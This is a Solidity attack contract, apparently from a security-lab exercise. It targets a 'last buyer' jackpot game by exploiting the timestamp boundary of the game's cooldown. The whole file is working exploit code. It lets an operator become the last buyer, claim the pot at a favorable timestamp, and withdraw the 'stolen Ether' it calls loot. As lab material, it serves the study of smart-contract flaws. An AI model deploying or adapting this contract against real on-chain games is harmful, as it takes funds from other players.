// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface ILastBuyerGame {
    function buyIn() external payable;
    function claimPot() external;
    function potBalance() external view returns (uint256);
}

/// @title TimestampBoundaryAttacker
/// @author Solidity Security Lab
/// @notice Attack contract that becomes the last buyer and then claims the pot as soon as a favorable timestamp is available.
contract TimestampBoundaryAttacker {
    /// @notice Target jackpot game.
    ILastBuyerGame public immutable target;

    /// @notice Attacker operator that controls the exploit contract.
    address public immutable operator;

    /// @notice Emitted when the attacker becomes the current leader.
    event AttackPositionOpened(uint256 amount);

    /// @notice Emitted when the pot is claimed from the target.
    event PotCaptured(uint256 amount);

    /// @notice Emitted when stolen Ether is withdrawn to the operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(address targetAddress) {
        target = ILastBuyerGame(targetAddress);
        operator = msg.sender;
    }

    /// @notice Sends a buy-in to become the current leader.
    function becomeLastBuyer() external payable {
        require(msg.sender == operator, "Only operator can buy");
        require(msg.value > 0, "Buy-in must be greater than zero");

        target.buyIn{value: msg.value}();
        emit AttackPositionOpened(msg.value);
    }

    /// @notice Claims the full pot from the target once the contract believes cooldown has ended.
    function claimPot() external {
        require(msg.sender == operator, "Only operator can claim");

        uint256 amountBefore = address(this).balance;
        target.claimPot();
        emit PotCaptured(address(this).balance - amountBefore);
    }

    /// @notice Transfers captured Ether to the operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
